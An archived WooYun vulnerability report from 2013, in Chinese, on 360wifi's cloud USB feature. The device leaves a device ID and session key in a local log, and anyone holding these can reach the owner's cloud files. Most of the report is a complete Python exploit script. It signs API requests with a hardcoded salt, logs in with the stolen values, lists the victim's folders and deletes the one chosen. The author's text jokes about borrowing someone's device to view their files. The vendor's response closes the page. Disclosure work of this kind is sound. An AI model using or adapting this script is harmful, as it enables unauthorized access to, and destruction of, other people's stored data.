@@ -1,0 +1,360 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360wifi轻插一次可实现永久控制  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360wifi轻插一次可实现永久控制  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/路人甲">路人甲</a> 
+</li><li>提交时间：		2013-10-30 17:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-30：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-02：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-09：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-19：	细节向普通白帽子公开<br/>
+									2013-12-09：	细节向实习白帽子公开<br/>
+									2014-01-28：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">360wifi有个神奇的功能叫云U盘。它有个地方设计不当，就是在电脑上插一次之后，会在本地记录该wifi的devid和skey。之后呢？你就能通过该devid和skey任意访问云U盘中的文件了。借一下别人的360wifi，轻插一下你的电脑，然后还给他。然后你就能任意看他云U盘中的岛国电影了</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在file://C:\Users\用户名\AppData\Roaming\360CloudWifi\expuser.log路径里，<br />
+<br />
+如下：<br />
+<br />
+</p><p class="detail"><a href="../images/30164312bee4d732d09c8dd6953f09551a3fd0c9.png" target="_blank"><img src="../images/30164312bee4d732d09c8dd6953f09551a3fd0c9.png" alt=".PNG" width="600"/></a></p><p class="detail"><br />
+<br />
+之后你把这两个值写到以下python文件里。<br />
+<br />
+</p><pre><code>#coding=utf-8<br />
+import urllib<br />
+import urllib2<br />
+import hashlib<br />
+from xml.dom import minidom<br />
+<br />
+<br />
+getconf_url = &quot;http://w.yunpan.360.cn/intf.php&quot;;<br />
+login_url = &quot;http://w%s.yunpan.360.cn/intf.php?method=WifiUser.login&amp;qid=%s&amp;devtype=Wifi&amp;v=&amp;devid=%s&amp;devname=&amp;rtick=6198368&amp;sign=%s&amp;&quot;<br />
+detail_url = &quot;http://api%s.yunpan.360.cn/intf.php?method=User.getUserDetail&amp;qid=%s&amp;devtype=Wifi&amp;v=1.0.0.1030&amp;devid=%s&amp;devname=&amp;rtick=6211423&quot;;<br />
+<br />
+getfile_url = &quot;http://api%s.yunpan.360.cn/intf.php?method=File.getAllNodesV2&amp;qid=%s&amp;devtype=Wifi&amp;v=1.0.0.1030&amp;devid=%s&amp;devname=&amp;rtick=5350229&quot;;<br />
+<br />
+delfile_url = &quot;http://api%s.yunpan.360.cn/intf.php?method=File.delete&amp;qid=%s&amp;devtype=Wifi&amp;v=1.0.0.1050&amp;devid=%s&amp;devname=&amp;rtick=11609065&quot;;<br />
+###请将这两个值改成file://C:\Users\用户名\AppData\Roaming\360CloudWifi\expuser.log中的devid和skey<br />
+###上面的日志如下 /start /devid=xxxxxxxxxxxxxxxxx /skey=bbbbbbbbbbbbb<br />
+key = {&#039;skey&#039;:&#039;aaaaaaaa&#039;} <br />
+devid = &quot;bbbbbbbbbbbbbbbbbbbbbbb&quot;<br />
+<br />
+getConf = {<br />
+	&#039;method&#039;:&#039;WifiUser.getConfig&#039;,<br />
+	&#039;qid&#039;:&#039;&#039;,<br />
+	&#039;devtype&#039;:&#039;Wifi&#039;,<br />
+	&#039;devid&#039;: devid,<br />
+	&#039;devname&#039;:&#039;&#039;,<br />
+	&#039;rtick&#039;:&#039;2529285&#039;,<br />
+	&#039;v&#039;:&#039;&#039;,<br />
+	&#039;sign&#039;:&#039;&#039;<br />
+};<br />
+<br />
+userLogin = {<br />
+	&#039;method&#039;:&#039;WifiUser.login&#039;,<br />
+	&#039;qid&#039;:&#039;&#039;,<br />
+	&#039;devtype&#039;:&#039;Wifi&#039;,<br />
+	&#039;devid&#039;:devid,<br />
+	&#039;devname&#039;:&#039;&#039;,<br />
+	&#039;rtick&#039;:&#039;6198368&#039;,<br />
+	&#039;v&#039;:&#039;&#039;,<br />
+	&#039;sign&#039;:&#039;&#039;<br />
+};<br />
+<br />
+<br />
+<br />
+def getcontent(page, name):<br />
+	i = page.find(name+&quot;=&quot;)<br />
+	mylen = len(page)<br />
+	j = i+4<br />
+	left = -1;<br />
+	if(i!=-1):<br />
+		for k in range(j, len(page)-1):<br />
+			if(page[k]==&#039;&quot;&#039;and left==-1):<br />
+				left=k+1;<br />
+			elif(page[k]==&#039;&quot;&#039; and left&gt;0):<br />
+				right=k<br />
+				break;<br />
+	if(left!=-1):<br />
+		return page[left:right]<br />
+	<br />
+<br />
+<br />
+def ksort(d):<br />
+	result=&quot;&quot;;<br />
+	for k in sorted(d.keys()):<br />
+		if k!=&#039;sign&#039;:<br />
+			result=result+k+&#039;=&#039;+d[k]<br />
+	#print result<br />
+	return result<br />
+<br />
+def getsign(data):<br />
+	salt=&#039;243dcc291a9d8f31e21c9c580cfdce64&#039;<br />
+	data1=ksort(data)<br />
+	data1 = data1+salt<br />
+	sign = hashlib.md5(data1).hexdigest()<br />
+	#print &quot;sign is &quot;+sign<br />
+	return sign<br />
+<br />
+def signurl(url):<br />
+	paramlist = url.split(&quot;?&quot;)<br />
+	params = paramlist[1]<br />
+	pv = params.split(&quot;&amp;&quot;)<br />
+	data = {}<br />
+	for k in pv:<br />
+		p = k.split(&quot;=&quot;)<br />
+		data[p[0]] = p[1]<br />
+	return getsign(data)<br />
+	<br />
+	<br />
+def login(cid, qid, key):<br />
+	userLogin[&#039;qid&#039;]=qid;<br />
+	sign = getsign(userLogin);<br />
+	userLogin[&#039;sign&#039;] = sign;<br />
+	login_url1 = login_url%(cid, qid, devid, sign)<br />
+	req = urllib2.Request(login_url1);<br />
+	req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0&#039;)<br />
+	req.add_header(&#039;Cookie&#039;, urllib.urlencode(key))<br />
+	response = urllib2.urlopen(req);<br />
+	page = response.read()<br />
+	token = getcontent(page,&quot;token&quot;)<br />
+	return token<br />
+<br />
+def detail(cid, qid, devid, token):<br />
+	detail1 = detail_url%(cid,qid, devid)<br />
+	sign = signurl(detail1)<br />
+	detail1 = detail1+&quot;&amp;sign=&quot;+sign+&quot;&amp;ofmt=xml&amp;pid=&amp;&quot;;<br />
+	req = urllib2.Request(detail1);<br />
+	req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0&#039;)<br />
+	req.add_header(&#039;Cookie&#039;, &quot;token=&quot;+token)<br />
+	response = urllib2.urlopen(req);<br />
+	page = response.read()<br />
+	<br />
+	<br />
+<br />
+def getAllFile(cid, qid, devid, token):<br />
+	getfile = getfile_url%(cid, qid, devid)<br />
+	sign = signurl(getfile)<br />
+	getfile = getfile+&quot;&amp;sign=&quot;+sign+&quot;&amp;ofmt=xml&amp;pid=&amp;&quot;;<br />
+	req = urllib2.Request(getfile)<br />
+	req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0&#039;)<br />
+	req.add_header(&#039;Cookie&#039;, &quot;token=&quot;+token+&quot;;count=1000&quot;)<br />
+	response = urllib2.urlopen(req);<br />
+	page = response.read()<br />
+	data = parseFile(page)<br />
+	return data<br />
+	<br />
+<br />
+	<br />
+<br />
+def deleteFile(cid, qid, devid, token, fname):<br />
+	delfile = delfile_url%(cid, qid, devid)<br />
+	sign = signurl(delfile)<br />
+	delfile = delfile + &quot;&amp;sign=&quot;+sign+&quot;&amp;ofmt=xml&amp;pid=home&amp;&quot;<br />
+	req = urllib2.Request(delfile)<br />
+	req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0&#039;)<br />
+	req.add_header(&#039;Cookie&#039;, &quot;token=&quot;+token+&quot;;fname=/&quot;+fname+&quot;/&quot;)<br />
+	response = urllib2.urlopen(req);<br />
+	page = response.read()<br />
+	print page<br />
+	<br />
+<br />
+	<br />
+def parseFile(page):<br />
+	doc = minidom.parseString(page)<br />
+	root = doc.documentElement<br />
+	dir_infos = root.getElementsByTagName(&quot;dir_info&quot;);<br />
+	<br />
+	i = 0;<br />
+	data = {}<br />
+	print &quot;directory in the safe 360 yunpan: &quot;<br />
+	for node in dir_infos:<br />
+		pid = node.getAttribute(&quot;pid&quot;)<br />
+		if pid==&quot;0&quot;:<br />
+			print i<br />
+			print &quot;:&quot;<br />
+			print node.getAttribute(&quot;fname&quot;)<br />
+			data[i] = node.getAttribute(&quot;fname&quot;)<br />
+			i=i+1<br />
+	return data<br />
+	<br />
+&#039;&#039;&#039;	<br />
+proxy_handler = urllib2.ProxyHandler({&#039;http&#039;: &#039;127.0.0.1:8081&#039;})<br />
+opener = urllib2.build_opener(proxy_handler)				<br />
+urllib2.install_opener(opener) &#039;&#039;&#039;<br />
+sign = getsign(getConf);<br />
+getConf[&#039;sign&#039;]=sign<br />
+req = urllib2.Request(getconf_url+&quot;?&quot;+urllib.urlencode(getConf));<br />
+req.add_header(&#039;User-Agent&#039;,&#039;Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0&#039;)<br />
+req.add_header(&#039;Cookie&#039;, urllib.urlencode(key)) <br />
+response = urllib2.urlopen(req);<br />
+page = response.read()<br />
+<br />
+cid = getcontent(page, &quot;cid&quot;)<br />
+qid = getcontent(page, &quot;qid&quot;)<br />
+token = login(cid, qid, key)<br />
+data = getAllFile(cid, qid, devid, token)<br />
+i = int(input(&quot;which do you want to delete? better choose an english name directory input the number:   &quot;))<br />
+deleteFile(cid, qid, devid, token, data[i])</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+运行下哈，选择一个你想删除的文件夹，删除吧。<br />
+<br />
+代码里有个bug，暂时不支持删除中文文件夹名哦。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/30165213f393eb6a496b5ddac278aaec2ca98f47.png" target="_blank"><img src="../images/30165213f393eb6a496b5ddac278aaec2ca98f47.png" alt=".PNG" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们更专业 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/路人甲" title="路人甲">路人甲</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041487" title="360wifi轻插一次可实现永久控制">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-10-30 18:24</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢反馈。由于攻击者必须拿到随身wifi设备，才能获取云U盘登录信息，因此漏洞评级为低。我们将会在新版中进一步增强登录验证机制，降低此类安全风险。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41487";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
